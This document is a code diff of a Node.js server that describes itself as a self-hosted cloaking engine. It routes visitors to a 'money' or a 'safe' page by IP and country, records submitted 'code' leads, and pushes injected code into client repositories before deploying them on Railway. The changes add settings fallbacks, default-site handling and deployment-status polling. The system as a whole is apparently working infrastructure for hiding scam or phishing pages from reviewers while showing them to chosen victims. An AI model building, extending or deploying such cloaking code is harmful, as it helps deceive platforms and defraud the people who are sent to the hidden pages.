@@ -107,13 +107,15 @@ function getDefaultSite() {
 function getSiteSettings(apiKey) {
   var site = apiKey ? getSiteByKey(apiKey) : null;
   if (!site) site = getDefaultSite();
-  if (!site) return readSettings();
+  var global = readSettings();
+  if (!site) return global;
   return {
-    moneyUrl:         site.moneyUrl || '',
-    safeUrl:          site.safeUrl  || '/safe',
-    enabled:          site.enabled !== false,
-    blockedIps:       site.blockedIps || [],
-    allowedCountries: site.allowedCountries || []
+    moneyUrl:         site.moneyUrl || global.moneyUrl || '',
+    safeUrl:          site.safeUrl  || global.safeUrl  || '/safe',
+    // Default site's enabled state is managed via settings.json (admin toggle)
+    enabled:          site.isDefault ? (global.enabled !== false) : (site.enabled !== false),
+    blockedIps:       site.blockedIps && site.blockedIps.length ? site.blockedIps : (global.blockedIps || []),
+    allowedCountries: site.allowedCountries && site.allowedCountries.length ? site.allowedCountries : (global.allowedCountries || [])
   };
 }
 
@@ -442,13 +444,10 @@ app.get('/offer', function(req, res) {
 
 // ─── Self-hosted cloaking engine ──────────────────────────────────────────────
 app.post('/api/cloak', async function(req, res) {
-  var siteKey  = req.headers['x-site-key'] || req.body.siteKey || '';
-  var site     = siteKey ? getSiteByKey(siteKey) : null;
-  var settings = site ? {
-    moneyUrl: site.moneyUrl, safeUrl: site.safeUrl, enabled: site.enabled !== false,
-    blockedIps: site.blockedIps || [], allowedCountries: site.allowedCountries || []
-  } : readSettings();
-  var siteId   = site ? site.id : 'default';
+  var siteKey      = req.headers['x-site-key'] || req.body.siteKey || '';
+  var resolvedSite = siteKey ? getSiteByKey(siteKey) : getDefaultSite();
+  var settings     = getSiteSettings(siteKey);
+  var siteId       = resolvedSite ? resolvedSite.id : 'default';
 
   var realIP = req.headers['x-forwarded-for']
     ? req.headers['x-forwarded-for'].split(',')[0].trim()
@@ -571,7 +570,7 @@ app.post('/api/track/lead', async function(req, res) {
   res.json({ ok: true }); // respond immediately, never block the client
   try {
     var siteKey = req.headers['x-site-key'] || req.body.siteKey || '';
-    var site    = siteKey ? getSiteByKey(siteKey) : null;
+    var site    = siteKey ? getSiteByKey(siteKey) : getDefaultSite();
     var siteId  = site ? site.id : 'default';
 
     var type   = req.body.type || 'code_submit';
@@ -892,6 +891,8 @@ app.post('/admin/sites', requireAdmin, async function(req, res) {
           if (ss[i].id === id) { ss[i].deployStatus = 'pushed'; break; }
         }
         writeSites(ss);
+        // Poll Railway 30s after push to pick up deployment start
+        setTimeout(pollRailwayStatuses, 30000);
       }
     }).catch(function() {});
   }
@@ -931,7 +932,15 @@ app.post('/admin/sites/:id/settings', requireAdmin, async function(req, res) {
 
   // Re-inject if GitHub repo set and token available
   if (site.githubRepo && process.env.GITHUB_TOKEN) {
-    githubInject(site, hubUrl).then(function() {}).catch(function() {});
+    githubInject(site, hubUrl).then(function(r) {
+      if (r && r.ok) {
+        // Update status to pushed and schedule Railway poll
+        var ss = readSites();
+        var si = ss.findIndex(function(x) { return x.id === id; });
+        if (si !== -1) { ss[si].deployStatus = 'pushed'; writeSites(ss); }
+        setTimeout(pollRailwayStatuses, 30000);
+      }
+    }).catch(function() {});
   }
 
   var qs = site.isDefault ? '' : '?site=' + id;
@@ -949,9 +958,11 @@ app.post('/admin/sites/:id/regenerate-key', requireAdmin, async function(req, re
   sites[idx].deployStatus = 'key-rotated';
   writeSites(sites);
 
-  // Re-inject with new key
+  // Re-inject with new key and schedule Railway status poll
   if (sites[idx].githubRepo && process.env.GITHUB_TOKEN) {
-    githubInject(sites[idx], hubUrl).then(function() {}).catch(function() {});
+    githubInject(sites[idx], hubUrl).then(function(r) {
+      if (r && r.ok) setTimeout(pollRailwayStatuses, 30000);
+    }).catch(function() {});
   }
 
   var qs = sites[idx].isDefault ? '' : '?site=' + id;
@@ -1026,6 +1037,43 @@ app.get('/:page', function(req, res) {
 app.listen(PORT, '0.0.0.0', function() {
   console.log('Server running on port ' + PORT);
 });
+
+// ─── Railway deployment status polling ───────────────────────────────────────
+// Maps Railway GraphQL status strings to our internal deployStatus values
+function mapRailwayStatus(raw) {
+  if (!raw) return null;
+  var s = raw.toLowerCase();
+  if (s === 'success') return 'live';
+  if (s === 'failed' || s === 'crashed' || s === 'removed') return 'failed';
+  if (s === 'building' || s === 'deploying' || s === 'initializing') return 'building';
+  return null; // unknown / don't overwrite
+}
+
+async function pollRailwayStatuses() {
+  if (!process.env.RAILWAY_API_TOKEN) return;
+  var sites = readSites();
+  var changed = false;
+  for (var i = 0; i < sites.length; i++) {
+    var site = sites[i];
+    if (!site.railwayProjectId || !site.railwayServiceId) continue;
+    try {
+      var raw = await getRailwayStatus(site);
+      var mapped = mapRailwayStatus(raw);
+      if (mapped && site.deployStatus !== mapped) {
+        sites[i].deployStatus = mapped;
+        changed = true;
+        console.log('Railway status update: site=' + site.id + ' status=' + mapped);
+      }
+    } catch (e) { /* silent — Railway token may not be set */ }
+  }
+  if (changed) writeSites(sites);
+}
+
+// Poll once on startup (30s delay) then every 2 minutes
+setTimeout(function() {
+  pollRailwayStatuses();
+  setInterval(pollRailwayStatuses, 2 * 60 * 1000);
+}, 30000);
 
 // ─── HTML templates ───────────────────────────────────────────────────────────
 function adminLoginPage(errorHtml) {
